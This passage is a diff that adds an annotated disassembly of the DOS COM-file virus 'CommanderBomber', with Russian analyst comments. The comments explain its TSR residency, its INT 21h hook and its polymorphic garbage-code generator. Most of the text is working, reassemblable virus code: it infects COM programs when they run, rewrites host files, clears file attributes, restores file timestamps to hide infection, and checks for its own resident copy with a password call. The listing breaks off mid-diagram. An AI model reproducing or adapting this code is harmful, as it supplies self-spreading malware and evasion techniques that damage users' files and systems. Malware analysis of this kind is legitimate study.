@@ -1,0 +1,2039 @@
+                                ;==============================================================================
+                                ;                       VIRUS : CommnaderBomber (RC-4096)
+                                ;==============================================================================
+                                COMMENT *
+                                    Вирус поражает файлы типа COM при запуске на выполнение (DOS func 4Bh). Ви-
+                                рус не заражает файл COMMAND.COM. COM-формат определяется по отсутсвию  подписи
+                                "MZ" или "ZM" в начале файла.
+                                    Вирус не использует никаких выдающихся алгоритмов при заражении оперативной
+                                памяти. Он становится резидентным испорльзуя стандартную функцию 31h (TSR) опе-
+                                рационной системы. Очевидно, что автор не пытался реализовать ничего  нового  в
+                                плане захвата памяти. Вирус использует стандартные функции и его обезвреживание
+                                в памяти не представляет каких-либо сложностей. Свое присутствие в памяти вирус
+                                определяет по несуществующей функции DOS (func 424Fh). При  этом в качетсве па-
+                                роля примпеняется первый слог "BO", а в качестве ответа - второй слог "MB" сло-
+                                ва "BOMB".
+                                    Вирус работоспособен только в MS-DOS версии 3.0 и выше.
+                                    Вирус не проставляет никаких признаков зараженности.  Вместо  этого  он ис-
+                                пользует довольно оригинальный  алгоритм самолечения при  повторном  заражении.
+                                В принципе возможно многократное заражение программы-носителя. Однако этого  не
+                                происходит.  Каждый раз при запуске зараженной программы  вирус  перезаписывает
+                                тело программы в том виде, который она имела в момент поражения ее этой  копией
+                                вируса.  При этом происходит отсекание  всего лишнего.  Т.е. при запуске много-
+                                кратно зараженной программы каждая последующая копия вируса будет отсекать пре-
+                                дыдущую. На практике это выглыдит так: запускаемая зараженная программа при ре-
+                                зидентном вирусе еще раз заражается, а после якобы передачи управления програм-
+                                ме-носителю вторая только что прицепивщаяся копия вируса отсекается первой  ко-
+                                пией. Таким образом, заразив файл, вирус становится стражем  над  этим файлом -
+                                не пропускает ни своих собратьев, ни какой либо другой вирус. Подобные действия
+                                весьма замедляют работу вируса, особенно, если  пользоваться дискетами. Так как
+                                многократная  запись на диск в момент запуска зараженных программ будет  весьма
+                                заметна для пользователя.
+                                    Основная изюминка представленного вируса -  это полиморфный генератор,  ко-
+                                торый является весьма оригинальным, поскольку использует почти все команды про-
+                                цессора i8086.
+                                    Следует отметить, что создаваемый полиморфный код  есть  набором совершенно
+                                бессмысленных команд, представляющих собой  своеобразный забор  пред  смысловым
+                                кодом. Для простоты будем называть такой забор "полиморфным мусором".
+                                    Вирус также примечателен тем, что в нем впервые применен алгоритм "опплевы-
+                                вания" файла, т.е. вирус формирует в теле заражаемой программы отдельные участ-
+                                ки кода, которые интенсивно взаимодействуют между собой посредством команд  пе-
+                                редачи управления CALL, JMP, RET.  При этом участки кода располагаются по  всей
+                                программе в самых разных местах и самой разной длины.
+                                    Для отслеживания всех команд передачи управления вирус довольно  интенсивно
+                                использует стековую память (как HEAP область),  формируя в ней два динамических
+                                массива.
+                                *
+
+                                in_reg          equ     00000010b    ; пересылка в регистр
+                                out_reg         equ     00000000b    ; пересылка из регистра
+                                BY_BYTE         equ     00000000b    ; обмен байтами
+                                BY_WORD         equ     00000001b    ; обмен словами
+                                SEG_REGs        equ     00011000b    ; маска сегментных регистров
+
+                                dop             macro   Operation,Direction
+                                                db      Operation or Direction
+                                dop             endm
+
+                                seg_a           segment byte public use16
+                                                assume  cs:seg_a, ds:seg_a
+
+                                                org     100h
+
+                                Start           label   near
+
+     0100                       Vir_start:
+     0100  33 E4                                xor     sp,sp              ; Организуем стек на вершине сегмента
+     0102  FB                                   sti                        ; Enable interrupts
+     0103  E8 0074                              call    sub_017A
+     ;----------------------------------------------------------------------------------------------------------
+     0106 .43 4F 4D 4D 41 4E    Copyright       db      'COMMANDER BOMBER WAS HERE'
+     010C  44 45 52 20 42 4F
+     0112  4D 42 45 52 20 57
+     0118  41 53 20 48 45 52
+     011E  45
+     ;----------------------------------------------------------------------------------------------------------
+     011F                       loc_011F:
+                                ;--------------- перехват прерывания INT 21h ---------------
+     011F  B8 3521                              mov     ax,3521h
+     0122  CD 21                                int     21h                     ; DOS Services  ah=function 35h
+                                                                                ;  get intrpt vector al in es:bx
+     0124  89 1E 0235                           mov     ds:data_0235,bx
+     0128  8C 06 0237                           mov     ds:data_0237,es
+     012C .BA 022A                              mov     dx,offset sub_022A
+     012F  B4 25                                mov     ah,25h
+     0131  CD 21                                int     21h                     ; DOS Services  ah=function 25h
+                                                                                ;  set intrpt vector al to ds:dx
+     0133  E8 0942                              call    RANDOMIZE          ; настройка генератора
+                                ;--------------- освободить окружение ----------------------
+     0136  8E 1E 002C                           mov     ds,ds:[002Ch]
+     013A  8B D5                                mov     dx,bp
+     013C  1E                                   push    ds
+     013D  07                                   pop     es                      ; ES = DS
+     013E  B4 49                                mov     ah,49h
+     0140  CD 21                                int     21h                     ; DOS Services  ah=function 49h
+                                                                                ;  release memory block, es=seg
+                                ;--------------- переразметить блок памяти -----------------
+     0142  0E                                   push    cs
+     0143  07                                   pop     es
+     0144  BB 00AC                              mov     bx,(Vir_END - Vir_Start + 0100h) / 16
+     0147  B4 4A                                mov     ah,4Ah
+     0149  CD 21                                int     21h                     ; DOS Services  ah=function 4Ah
+                                                                                ;  change memory allocation
+                                                                                ;   bx=bytes/16, es=mem segment
+                                ;--------------- запустить ---------------------------------
+     014B .BB 016C                              mov     bx,offset data_016C
+     014E  26: 8C 47 04                         mov     es:[bx+4],es
+     0152  26: 8C 47 08                         mov     es:[bx+8],es
+     0156  26: 8C 47 0C                         mov     es:[bx+0Ch],es
+     015A  B8 4B00                              mov     ax,4B00h
+     015D  CD 21                                int     21h                     ; DOS Services  ah=function 4Bh
+                                                                                ;  run progm @ds:dx, parm @es:bx
+     015F  72 04                                jc      short loc_0165          ; Jump if carry Set
+     0161  B4 4D                                mov     ah,4Dh
+     0163  CD 21                                int     21h                     ; DOS Services  ah=function 4Dh
+                                                                                ;  get return code info in ax
+     0165                       loc_0165:
+     0165  BA 00AC                              mov     dx,Vir_END / 16
+     0168  B4 31                                mov     ah,31h
+     016A  CD 21                                int     21h                     ; DOS Services  ah=function 31h
+                                                                                ;  terminate & stay resident
+                                                                                ;   al=return code,dx=paragraphs
+     ;----------------------------------------------------------------------------------------------------------
+                                ; Блок параметров EXEC
+     016C  00                   data_016C       db      0
+     016D  00 80 00 CC 0F 5C                    db       00h, 80h, 00h,0CCh, 0Fh, 5Ch
+     0173  00 CC 0F 6C 00 CC                    db       00h,0CCh, 0Fh, 6Ch, 00h,0CCh
+     0179  0F                                   db       0Fh
+
+
+                                ;==========================================================================
+                                sub_017A:
+     017A  FC                                   cld                             ; Clear direction
+     017B  5E                                   pop     si                      ; SI = offset Copyright
+     017C  83 EE 06                             sub     si,offset Copyright - offset Vir_start
+                                ; SI = absolute address base
+     017F  0E                                   push    cs
+     0180  1F                                   pop     ds                      ; DS = CS
+     0181  1E                                   push    ds
+     0182  07                                   pop     es                      ; ES = CS
+     0183  33 C0                                xor     ax,ax                   ; Zero register
+                                ; Create small procedure at address 00FCh
+                                ;----------------------------
+                                ; 00FC   F3        repz
+                                ; 00FD   A5        movsw                        ; Movsb ds:[si] to es:[di]
+                                ; 00FE   EB 1F     jmp loc_011F
+                                ;----------------------------
+     0185  BF 00FC                              mov     di,offset start - 4
+     0188  50                                   push    ax
+     0189  57                                   push    di
+     018A  B8 A5F3                              mov     ax,0A5F3h
+     018D  AB                                   stosw                           ; Store ax to es:[di]
+                                                                                ;  di=di+2, di=00FEh
+     018E  B8 1FEB                              mov     ax,1FEBh
+     0191  AB                                   stosw                           ; Store ax to es:[di]
+                                                                                ;  di=di+2, di=0100h
+                                ; -------------- проверка версии DOS ------------
+                                ; под DOS версии мешьше чем 3.x вирус не работает
+     0192  B4 30                                mov     ah,30h
+     0194  CD 21                                int     21h                     ; DOS Services  ah=function 30h
+                                                                                ;  get DOS version number ax
+     0196  3C 03                                cmp     al,3
+     0198  72 5D                                jb      short loc_01F7          ; Jump if below
+                                ; Если версия DOS 3.x+ то в копии системного окружения есть строка
+                                ; с полным именем файла. Ищем это полное имя
+     019A  56                                   push    si
+     019B  33 F6                                xor     si,si
+     019D  8E 5C 2C                             mov     ds,[si+2Ch]             ; DS = DOS environ segment
+     01A0                       loc_01A0:
+     01A0  AD                                   lodsw                           ; String [si] to ax
+     01A1  4E                                   dec     si
+     01A2  0B C0                                or      ax,ax                   ; Zero ?
+     01A4  75 FA                                jnz     loc_01A0                ; Jump if not 00
+     01A6  8D 6C 03                             lea     bp,[si+3]               ; DS:BP - полное имя программы
+     01A9  5E                                   pop     si
+                                ; -------------- проверка резидента паролем через INT 21h --------
+                                ; используется функция 42h с несуществующим методом установки 4Fh
+     01AA  B8 424F                              mov     ax,'BO'
+     01AD  CD 21                                int     21h                     ; DOS Services  ah=function 42h
+     01AF  3D 4D42                              cmp     ax,'MB'
+                                                                         ; Если вирус резидентен, то нет ника-
+                                                                         ; кого смысла в восстановлении прог-
+                                                                         ; раммы-носителя, нужно активизиро-
+                                                                         ; вать вирус (все бросаем и вперед
+                                                                         ; на активизацию вируса)
+     01B2  75 62                                jne     short loc_0216   ; Jump if not TSR virus
+                                ; -------------- открыть программу-носитель ----------------------
+     01B4  8B D5                                mov     dx,bp
+     01B6  B8 3D02                              mov     ax,3D02h
+     01B9  CD 21                                int     21h                     ; DOS Services  ah=function 3Dh
+                                                                                ;  open file, al=mode,name@ds:dx
+     01BB  06                                   push    es
+     01BC  1F                                   pop     ds                      ; DS = ES
+     01BD  72 38                                jc      short loc_01F7          ; Jump if CF=1 (т.е. защита от
+                                                                                ;                записи)
+     01BF  93                                   xchg    bx,ax
+                                ; сохранить дату и время создания программы-носителя
+     01C0  B8 5700                              mov     ax,5700h
+     01C3  CD 21                                int     21h                     ; DOS Services  ah=function 57h
+                                                                                ;  get file date+time, bx=handle
+                                                                                ;   returns cx=time, dx=time
+     01C5  72 2C                                jc      short loc_01F3          ; Jump if CF=1
+                                ; --------------------------------------------------------------------
+                                ;              * Восстановить образ памяти из MEM-блока *
+                                ; --------------------------------------------------------------------
+                                ; Задача следующего кода состоит в восстановлении образа памяти до его
+                                ; начального вида перед запуском. Т.к. пока процессор проходил через
+                                ; полиморфный "мусор" к телу вируса содержимое ячеек памяти, которые
+                                ; были выделены под модификацию, было изменено. Восстановление моди-
+                                ; фицированных ячеек проводится по записям в MEM-блоке.
+                                ; Формат MEM-блока : dw адрес, dw содержимое, dw адрес, dw содержимое
+                                ; и т.д.
+                                ; --------------------------------------------------------------------
+     01C7  52                                   push    dx
+     01C8  51                                   push    cx
+     01C9  56                                   push    si
+     01CA  81 C6 09C0                           add     si,Vir_END - Vir_start  ; SI = указатель на MEM-блок
+     01CE                       loc_01CE:
+     01CE  AD                                   lodsw                           ; String [si] to ax
+     01CF  FE C4                                inc     ah                      ; прибавить 0100h
+     01D1  74 04                                jz      short loc_01D7          ; Jump if Mark-end
+     01D3  97                                   xchg    di,ax
+     01D4  A5                                   movsw                           ; Mov [si] to es:[di]
+     01D5  EB F7                                jmp     short loc_01CE
+     01D7                       loc_01D7:
+     01D7  5E                                   pop     si
+                                ;--------------- перезаписать тело зараженной программы -------
+     01D8  BA 0100                              mov     dx,100h
+     01DB  B9 1000                              mov     cx,1000h
+     01DE  03 8C 0110                           add     cx,offset OriginalFileSize - Vir_start [si]
+     01E2  B4 40                                mov     ah,40h
+     01E4  CD 21                                int     21h                     ; DOS Services  ah=function 40h
+                                                                                ;  write file  bx=file handle
+                                                                                ;   cx=bytes from ds:dx buffer
+                                ;--------------- Обрезка лишнего (отбросить вторую копию) --------
+     01E6  33 C9                                xor     cx,cx                   ; Zero register
+     01E8  B4 40                                mov     ah,40h
+     01EA  CD 21                                int     21h                     ; DOS Services  ah=function 40h
+                                                                                ;  write file  bx=file handle
+                                                                                ;   cx=bytes from ds:dx buffer
+     01EC  59                                   pop     cx
+     01ED  5A                                   pop     dx
+                                ; восстановить дату и время создания программы-носителя
+     01EE  B8 5701                              mov     ax,5701h
+     01F1  CD 21                                int     21h                     ; DOS Services  ah=function 57h
+                                                                                ;  set file date+time, bx=handle
+                                                                                ;   cx=time, dx=time
+     01F3                       loc_01F3:
+                                ; -------------- закрыть зараженную программу
+     01F3  B4 3E                                mov     ah,3Eh
+     01F5  CD 21                                int     21h                     ; DOS Services  ah=function 3Eh
+                                                                                ;  close file, bx=file handle
+     01F7                       loc_01F7:
+     01F7  C6 06 00FF 00                        mov     byte ptr ds:[00FFh],0   ; При резидентном вирусе нужно
+                                                                                ; запускать программу носитель
+                                ; -------------------------------------------------------------------------
+                                ;  * ВОССТАНОВИТЬ в памяти программу-носитель по информации в ИНФО-блоке *
+                                ; -------------------------------------------------------------------------
+     01FC  56                                   push    si
+     01FD  81 C6 0BC0                           add     si,Vir_END - Vir_start + 0200h
+     0201                       loc_0201:
+     0201  AD                                   lodsw                           ; String [si] to ax
+     0202  8B C8                                mov     cx,ax
+     0204  E3 08                                jcxz    short loc_020E          ; Jump if cx=0
+     0206  AD                                   lodsw                           ; String [si] to ax
+     0207  FE C4                                inc     ah
+     0209  97                                   xchg    di,ax
+     020A  F3/ A4                               rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
+     020C  EB F3                                jmp     short loc_0201
+     020E                       loc_020E:
+     020E  5F                                   pop     di                      ; вирус копируется сам на себя
+     020F  BE 3000                              mov     si,1111h                ; размер файла-носителя до заражения
+                                OriginalFileSize =      word ptr $ - 2
+     0212  81 C6 0100                           add     si,offset start         ; COM программы с адреса 0100h
+     0216                       loc_0216:
+     0216  B9 0800                              mov     cx,4096 / 2             ; размер вируса в словах
+     0219  06                                   push    es
+     021A  1F                                   pop     ds                      ; DS = ES
+     021B  C3                                   retn
+
+                                ;==========================================================================
+                                ; Чтение из файла по адресу ES:0000
+                                ;==========================================================================
+
+                                sub_021C        proc    near
+     021C  33 D2                                xor     dx,dx           ; DX = 0000
+     021E  B9 EF00                              mov     cx,0EF00h       ; количество байт для чтения
+                                                                        ;  (маскимально)
+     0221  B4 3F                                mov     ah,3Fh
+
+                                ;==========================================================================
+                                ; Моделируем вызов оригинального диспечера DOS
+                                ;==========================================================================
+                                DOS_func:
+     0223  9C                                   pushf                           ; Push flags
+     0224  FA                                   cli                             ; Disable interrupts
+     0225  0E E8 000B                           callf   sub_0234
+     0229  C3                                   retn
+                                sub_021C        endp
+
+                                ;==========================================================================
+                                ; Вирусный обработчик диспечера DOS (INT 21h)
+                                ;==========================================================================
+                                sub_022A        proc    far
+     022A  3D 4B00                              cmp     ax,4B00h
+     022D  74 0E                                je      short loc_023D          ; Jump if equal
+     022F  3D 424F                              cmp     ax,'BO'
+     0232  74 05                                je      short loc_0239          ; Jump if equal
+
+                                ;==========================================================================
+                                ;               Передача управления оригинальному INT 21h
+                                ;==========================================================================
+                                sub_0234        proc    far
+     0234  EA                                   db      0EAh                    ;jmp     far ptr 0:0
+     0235  0042                 data_0235       dw      ?
+     0237  DCB6                 data_0237       dw      ?
+                                sub_0234        endp
+
+                                ;==========================================================================
+     0239                       loc_0239:
+     0239  B8 4D42                              mov     ax,'MB'                 ; ответ на пароль
+     023C  CF                                   iret                            ; Interrupt return
+     023D                       loc_023D:
+     023D  2E: 8C 16 0324                       mov     cs:Save_SS,ss
+     0242  2E: 89 26 0329                       mov     cs:Save_SP,sp           ; сохранить указатель стека
+     0247  FA                                   cli                             ; Disable interrupts
+     0248  8C C8                                mov     ax,cs
+     024A  8E D0                                mov     ss,ax
+     024C  BC 0100                              mov     sp,offset Start         ; организовать стек на месте
+                                                                                ;  PSP
+     024F  FB                                   sti                             ; Enable interrupts
+     0250  06                                   push    es
+     0251  1E                                   push    ds
+     0252  55                                   push    bp
+     0253  57                                   push    di
+     0254  56                                   push    si
+     0255  52                                   push    dx
+     0256  51                                   push    cx
+     0257  53                                   push    bx
+     0258  FC                                   cld                             ; Clear direction
+     0259  8B F2                                mov     si,dx                   ; DS:DX - имя программы
+     025B  B9 0050                              mov     cx,50h                  ; длина имени 80 символов
+     025E  8B FE                                mov     di,si
+                                ;--------------- выделяем имя программы ---------------------------------------
+     0260                       locloop_0260:
+     0260  AC                                   lodsb                           ; String [si] to al
+     0261  3C 3A                                cmp     al,':'
+     0263  74 04                                je      short loc_0269          ; Jump if equal
+     0265  3C 5C                                cmp     al,'\'
+     0267  75 02                                jne     short loc_026B          ; Jump if not equal
+     0269                       loc_0269:
+     0269  8B FE                                mov     di,si
+     026B                       loc_026B:
+     026B  0A C0                                or      al,al                   ; Zero ?
+     026D  E0 F1                                loopnz  locloop_0260            ; Loop if zf=0, cx>0
+                                ;--------------- файл с именем COMMAND не заражается
+     026F  8B F7                                mov     si,di
+     0271  BF 0105                              mov     di,offset Copyright - 1
+     0274  B1 07                                mov     cl,7
+
+     0276                       locloop_0276:
+     0276  AC                                   lodsb                           ; String [si] to al
+     0277  24 DF                                and     al,0DFh                 ; al = UpCase (al)
+     0279  47                                   inc     di
+     027A  2E: 3A 05                            cmp     al,cs:[di]
+     027D  E1 F7                                loopz   locloop_0276            ; Loop if zf=1, cx>0
+
+     027F  75 09                                jnz     short loc_028A          ; Jump if not zero
+     0281  AC                                   lodsb                           ; String [si] to al
+     0282  0A C0                                or      al,al                   ; Zero ?
+     0284  74 0E                                jz      short loc_0294          ; Jump if yes
+     0286  3C 2E                                cmp     al,'.'
+     0288  74 0A                                je      short loc_0294          ; Jump if equal
+                                ;--------------- захватить память ---------------------------------------
+                                ; Туда будем копироватиь тело вируса и организовывать программные массивы
+     028A                       loc_028A:
+     028A  BB 1000                              mov     bx,1000h                ; нужно 4Кбайта
+     028D  B4 48                                mov     ah,48h
+     028F  E8 FF91                              call    DOS_func
+     0292  73 03                                jnc     short loc_0297          ; Jump if carry=0
+     0294                       loc_0294:
+     0294  E9 0083                              jmp     loc_031A
+                                ;--------------- получить атрибуты файла ------------------
+     0297                       loc_0297:
+     0297  8E C0                                mov     es,ax
+     0299  B8 4300                              mov     ax,4300h
+     029C  E8 FF84                              call    DOS_func
+     029F  72 74                                jc      short loc_0315          ; Jump if carry Set
+                                ;--------------- снять если нужно атрибуты ----------------
+     02A1  D1 E9                                shr     cx,1                    ; Shift w/zeros fill
+     02A3  73 0A                                jnc     short loc_02AF          ; Jump if carry=0
+     02A5  D1 E1                                shl     cx,1                    ; Shift w/zeros fill
+     02A7  B8 4301                              mov     ax,4301h
+     02AA  E8 FF76                              call    DOS_func
+     02AD  72 66                                jc      short loc_0315          ; Jump if carry Set
+                                ;--------------- открыть файл -----------------------------
+     02AF                       loc_02AF:
+     02AF  B8 3D02                              mov     ax,3D02h
+     02B2  E8 FF6E                              call    DOS_func
+     02B5  72 5E                                jc      short loc_0315          ; Jump if carry Set
+     02B7  93                                   xchg    bx,ax
+     02B8  06                                   push    es
+     02B9  1F                                   pop     ds                      ; DS = ES
+     02BA  E8 FF5F                              call    sub_021C                ; прочитать файл
+     02BD  72 51                                jc      short loc_0310          ; Jump if carry Set
+                                ;--------------- проверяем какой длины файл --------------------
+     02BF  3B C1                                cmp     ax,cx                   ; Слишком большой
+     02C1  74 4D                                je      short loc_0310          ; Jump if =
+     02C3  3D 1400                              cmp     ax,1400h                ; Слишком маленький
+     02C6  72 48                                jb      short loc_0310          ; Jump if <
+                                ;===============================================================
+                                ;- [!] --------- Обрабатываем только файлы формата COM ---------
+                                ;===============================================================
+     02C8  81 3E 0000 5A4D                      cmp     word ptr ds:[0000],'ZM'
+     02CE  74 40                                je      short loc_0310          ; Jump if equal
+     02D0  81 3E 0000 4D5A                      cmp     word ptr ds:[0000],'MZ'
+     02D6  74 38                                je      short loc_0310          ; Jump if equal
+                                ;--------------- сохранить дату и время создания файла ---------
+     02D8  50                                   push    ax
+     02D9  B8 5700                              mov     ax,5700h
+     02DC  E8 FF44                              call    DOS_func
+     02DF  58                                   pop     ax
+     02E0  72 2E                                jc      short loc_0310          ; Jump if carry Set
+     02E2  2E: 89 0E 0308                       mov     cs:data_0308,cx
+     02E7  2E: 89 16 0305                       mov     cs:data_0305,dx
+                                ;===============================================================
+                                ;   Запустить процедуру генерирующую полиморфный "мусор"
+                                ;===============================================================
+     02EC  53                                   push    bx
+     02ED  E8 0069                              call    sub_0359
+     02F0  5B                                   pop     bx
+     02F1  50                                   push    ax
+                                ;--------------- позиционируемся на начало файла ---------------
+     02F2  33 C9                                xor     cx,cx                   ; Zero register
+     02F4  33 D2                                xor     dx,dx                   ; Zero register
+     02F6  B8 4200                              mov     ax,4200h
+     02F9  E8 FF27                              call    DOS_func
+     02FC  59                                   pop     cx
+     02FD  72 11                                jc      short loc_0310          ; Jump if carry Set
+                                ;--------------- записываем зараженный файл --------------------
+     02FF  B4 40                                mov     ah,40h
+     0301  E8 FF1F                              call    DOS_func
+                                ;--------------- восстановить дату и время ---------------------
+     0304  BA 1F97                              mov     dx,1111h
+                                data_0305       =       word ptr $ - 2
+     0307  B9 2B87                              mov     cx,1111h
+                                data_0308       =       word ptr $ - 2
+     030A  B8 5701                              mov     ax,5701h
+     030D  E8 FF13                              call    DOS_func
+                                ;--------------- закрыть файл ----------------------------------
+     0310                       loc_0310:
+     0310  B4 3E                                mov     ah,3Eh
+     0312  E8 FF0E                              call    DOS_func
+                                ;--------------- освободить память -----------------------------
+     0315                       loc_0315:
+     0315  B4 49                                mov     ah,49h
+     0317  E8 FF09                              call    DOS_func
+     031A                       loc_031A:                                       ; Leave virus
+     031A  5B                                   pop     bx
+     031B  59                                   pop     cx
+     031C  5A                                   pop     dx
+     031D  5E                                   pop     si
+     031E  5F                                   pop     di
+     031F  5D                                   pop     bp
+     0320  1F                                   pop     ds
+     0321  07                                   pop     es
+     0322  FA                                   cli                             ; Disable interrupts
+                                ;--------------- восстановить стек -----------------------------
+     0323  B8 0FCC                              mov     ax,1111h
+                                Save_SS         =       word ptr $ - 2
+     0326  8E D0                                mov     ss,ax
+     0328  BC FFF8                              mov     sp,1111h
+                                Save_SP         =       word ptr $ - 2
+                                ;--------------- продолжить работу диспечера --------------------
+     032B  B8 4B00                              mov     ax,4B00h                ; функция "ЗАПУСТИТЬ"
+     032E  E9 FF03                              jmp     sub_0234     ; передача управления оригинальному
+                                                                     ;  диспечеру DOS
+                                sub_022A        endp
+
+                                ;==========================================================================
+                                ;                              SUBROUTINE
+                                ;==========================================================================
+
+                                RND_0_FF        proc    near
+     0331  B8 0100                              mov     ax,100h
+     0334  EB 12                                jmp     short RND_0_AX
+
+     0336  B0 40                RND_0_3F:       mov     al,40h
+     0338  A9                                   db      0A9h                    ; TEST AX,im16
+     0339  B0 10                RND_0_F:        mov     al,10h
+     033B  A9                                   db      0A9h                    ; TEST AX,im16
+     033C  B0 08                RND_01234567:   mov     al,8
+     033E  A9                                   db      0A9h                    ; TEST AX,im16
+     033F  B0 04                RND_0123:       mov     al,4
+     0341  A9                                   db      0A9h                    ; TEST AX,im16
+     0342  B0 03                RND_012:        mov     al,3
+     0344  A9                                   db      0A9h                    ; TEST AX,im16
+     0345  B0 02                RND_01:         mov     al,2
+     0347  98                                   cbw                             ; Convrt byte to word
+
+                                ;==========================================================================
+
+                                RND_0_AX:
+     0348  52                                   push    dx
+     0349  51                                   push    cx
+     034A  50                                   push    ax
+     034B  E8 073C                              call    RND                     ; AX = RND
+     034E  59                                   pop     cx
+     034F  33 D2                                xor     dx,dx                   ; 0:AX
+     0351  F7 F1                                div     cx                      ; ax,dx rem=dx:ax/reg
+     0353  92                                   xchg    dx,ax                   ; AX = остаток от деления
+     0354  59                                   pop     cx
+     0355  5A                                   pop     dx
+     0356  0B C0                                or      ax,ax                   ; Zero ?
+     0358  C3                                   retn
+                                RND_0_FF        endp
+
+
+                                ;==========================================================================
+                                ; Основная процедура управляющая полиморфным механизмом
+                                ; Вход : AX = размер заражаемого COM-файла
+                                ;==========================================================================
+
+                                sub_0359        proc    near
+                                ;------- Определяем в файле случайный кусок размером 4Кбайта ---------------
+                                                ; сохранить размер файла-жертвы
+     0359  2E: A3 0210                          mov     cs:OriginalFileSize,ax
+     035D  8B F8                                mov     di,ax                   ; DI - указывает на конец файла
+                                                ; вычесть 4К из размера. Необходимо для того, чтобы
+                                                ; случайный кусок не оказался НА конце файла, а максимум
+                                                ; В конце файла
+     035F  B9 1000                              mov     cx,4096
+     0362  2B C1                                sub     ax,cx
+                                                ; случайный кусок в файле
+     0364  E8 FFE1                              call    RND_0_AX
+     0367  05 0020                              add     ax,20h
+     036A  2E: A3 04EB                          mov     cs:data_04EB,ax         ; AX - указывает на начало куска
+                                ;------- Приписываем выбранный кусок к концу файла ---------------------------------
+     036E  8B F0                                mov     si,ax
+     0370  F3/ A4                               rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
+                                ;-----------------------------------------------------------------------------------
+     0372  1E                                   push    ds
+     0373  0E                                   push    cs
+     0374  1F                                   pop     ds                      ; DS = CS
+     0375  A3 03D2                              mov     ds:data_03D2,ax         ; Верхняя граница области "A" - это
+                                                                                ;  начало выкушенной области
+     0378  97                                   xchg    di,ax                   ; DI - указывает на конец приписанного
+                                                                                ;  куска (файл + кусок)
+     0379  A3 03E7                              mov     ds:data_03E7,ax         ; Верхняя граница области "B" - это
+                                                                                ;  указатель на конец зараженного файла
+     037C  A3 059C                              mov     ds:data_059C,ax         ; Размера зараженного файла
+     037F  96                                   xchg    si,ax
+     0380  A3 03E2                              mov     ds:data_03E2,ax         ; Нижняя граница области "B" - это
+                                                                                ;  конец выкушенной области
+     0383  A3 03C1                              mov     ds:data_03C1,ax         ; Конец ИНФО-блока
+                                ;------- На место случайного куска копируем тело вируса ----------------------------
+     0386  BE 0100                              mov     si,offset Vir_Start
+     0389  B9 09C0                              mov     cx,offset Vir_End - offset Vir_Start    ; размер вируса
+     038C  F3/ A4                               rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
+                                ;-------- Инициализация всех вирусных счетчиков ------------------------------------
+     038E  33 C0                                xor     ax,ax                   ; Zero register
+     0390  A3 09E0                              mov     ds:BytesWrittenCounter,ax  ; сгенерированных байтов - ноль
+     0393  A3 06BE                              mov     ds:StackCounter,ax            ; слов в стеке - ноль
+     0396  A3 06F3                              mov     ds:data_06F3,ax
+     0399  A3 03CD                              mov     ds:data_03CD,ax        ; нижняя граница блока "A" - 0000
+     039C  89 3E 0A03                           mov     ds:data_0A03,di        ; динамический указатель на 
+                                                                               ;  MEM-блок
+     03A0  81 C7 0200                           add     di,0200h               ; Размер MEM-блока = 512 байт
+     03A4  89 3E 04E3                           mov     ds:data_04E3,di        ; динамический указатель на 
+                                                                               ;  ИНФО-блок
+     03A8  89 3E 09EA                           mov     ds:data_09EA,di        ; указатель на начало ИНФО-блока
+     03AC  1F                                   pop     ds
+                                ;------- Инициализация первых байтов информационной области ------------------------
+     03AD  AB                                   stosw                              ; Store ax to es:[di]
+     03AE  AB                                   stosw                              ; Store ax to es:[di]
+     03AF  2E: 89 26 0599                       mov     cs:data_0599,sp         ; сохранить стек
+                                ;-----------------------------------------------------------------------------------
+     03B4  93                                   xchg    bx,ax             ; BX = 0000
+                                                                          ; в теле полиморфного механизма BX
+                                                                          ; указывает на текущий адрес генери-
+                                                                          ; руемого участка
+     03B5  53                                   push    bx
+     03B6  53                                   push    bx                ; Два ноля в стеке - это два Mark-end
+     ;---------------------------------------------------------------------------------------------------------
+     ;                              * Использование стека *
+     ;---------------------------------------------------------------------------------------------------------
+     ; Помимо всех прочих целей вирус использует стековую память для размещения в ней двух динамических масси-
+     ; вов. Динамические потому, что заранее не известно сколько участков кода и подпрограмм сгенерируется при
+     ; новом заражении. Один из этих массивов используется для хранения информации при генерации вызова под-
+     ; программ в полиморфном "мусоре". Второй массив используется для хранения информации при формировании ко-
+     ; манд SHORT переходов. При этом формат хранимой информации одинаков для обоих массивов:
+     ;
+     ;   ................................................................... Информация хранится парами слов
+     ;   [ Первый массив ] 
+     ;   *  PUSH  0 (Mark-end)
+     ; 1 ┌─ PUSH  Количество слов в стеке на момент перехода к новому блоку 
+     ;   └─ PUSH  Адрес с которого делаем переход
+     ;      ...
+     ; N ┌─ PUSH  Количество слов в стеке на момент перехода к новому блоку 
+     ;   └─ PUSH  Адрес с которого делаем переход
+     ;   ................................................................... Информация хранится парами слов 
+     ;   [ Второй массив ]
+     ;   *  PUSH  0 (Mark-end)
+     ; 1 ┌─ PUSH  Количество слов в стеке на момент формирования SHORT перехода 
+     ;   └─ PUSH  Адрес команды SHORT перехода
+     ;      ...
+     ; N ┌─ PUSH  Количество слов в стеке на момент формирования SHORT перехода
+     ;   └─ PUSH  Адрес команды SHORT перехода   
+     ;   ...................................................................
+     ;   [Обычный стек]
+     ;---------------------------------------------------------------------------------------------------------
+
+                                ;---------- Гадаем будем или нет модифицировать DS в полиморфном мусоре ------------
+     03B7  E8 FF8B                              call    RND_01                  ; = 0 - нет
+     03BA  2E: A2 0A25                          mov     cs:data_0A25,al         ; = 1 - да
+     ;-----------------------------------------------------------------------------------------------------------
+     ;                                         * Проверка пределов *
+     ;-----------------------------------------------------------------------------------------------------------
+     ;     ┌─────────┐        ┌─────────┐                  ┌─────────┐                             ┌─────────┐
+     ;     │data_03CD│        │data_03D2│                  │data_03E2│                             │data_03E7│
+     ;     └────┬────┘        └────┬────┘                  └────┬────┘                             └────┬────┘
+     ;    0000 ┌┼────────//────────┼─╔══════════╦══════╤══════╗─┼────────//───────────┐┌────────────────┼─┐ NNNN
+     ;         │                     ║▓▓▓▓▓▓▓▓▓▓║░░░░░░│▒▒▒▒▒▒║                       ││                  │
+     ;         ││                  │ ║▓▓▓▓▓▓▓▓▓▓║░░░░░░│▒▒▒▒▒▒║ │                     ││                │ │
+     ;         │                     ║▓▓▓ТЕЛО▓▓▓║░MEM░░│▒Инфо▒║                       ││  Приписанный     │
+     ;         ││    Область A     │ ║▓▓▓▓▓▓▓▓▓▓║░░░░░░│▒▒▒▒▒▒║ │     Область B       ││   случайный    │ │
